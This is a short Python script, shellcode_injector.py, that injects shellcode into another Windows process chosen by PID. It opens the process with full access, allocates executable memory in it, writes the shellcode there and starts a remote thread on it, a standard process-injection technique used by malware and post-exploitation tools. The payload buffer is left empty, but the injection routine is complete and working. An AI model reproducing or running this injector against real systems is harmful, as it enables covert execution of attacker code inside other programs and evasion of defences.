#!/usr/bin/env python3

__author__      = 'Christophoros Petrou (game0ver)'
__version__     = '1.0'

import os
import sys
import platform
from ctypes import *
from argparse import (
    ArgumentParser,
    RawTextHelpFormatter
)

PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS     = 0x001F0FFF
VIRTUAL_MEM            = ( 0x00001000 | 0x00002000 )
kernel32 = windll.kernel32

shellcode =  b""

def console():
    parser = ArgumentParser(description="shellcode_injector.py: Inject shellcode into another process memory space.",
                formatter_class=RawTextHelpFormatter)
    parser._optionals.title = "Arguments:"
    parser.add_argument('-p', "--pid",
                type=int, default=None, required=False, metavar='',
                help="Specify the PID of the target process.")
    args = parser.parse_args()
    return args

def is_os_64bit():
    return platform.machine().endswith('64')

def migrate_res(pid, retcode):
    result = {
        1 : f"Shellcode successfully injected on PID: {pid}",
        2 : f"Couldn't acquire a handle to PID: {pid}",
        3 : f"Failed to inject shellcode on process with PID: {pid}"
    }
    return result[retcode]

def migrate_to_pid(pid):
    """
    This function is inspired & adapted from the "GRAY HAT PYTHON" book.
    However it's modified to work also for x64 Windows systems.
    """
    try:
        h_process  = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )
        if not h_process:
            return 2
        arg_address = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(h_process, arg_address, shellcode, len(shellcode), byref(c_int(0)))
        if is_os_64bit():
            return 3 if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(c_int64(0))) else 1
        else:
            return 3 if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(c_ulong(0))) else 1
    except Exception as error:
        return 3

if __name__ == '__main__':
    args = console()
    if args.pid:
        if os.name == 'nt':
            if shellcode:
                res = migrate_to_pid(args.pid)
                print("[!] {}".format(migrate_res(args.pid, res)))
            else:
                print('[x] No shellcode specified...')
        else:
            print('[*] For now "migrate" command is available only for x86 & x64 windows systems.')
    else:
        print(f"usage: {sys.argv[0]} [-h] [-p]")
        sys.exit(0)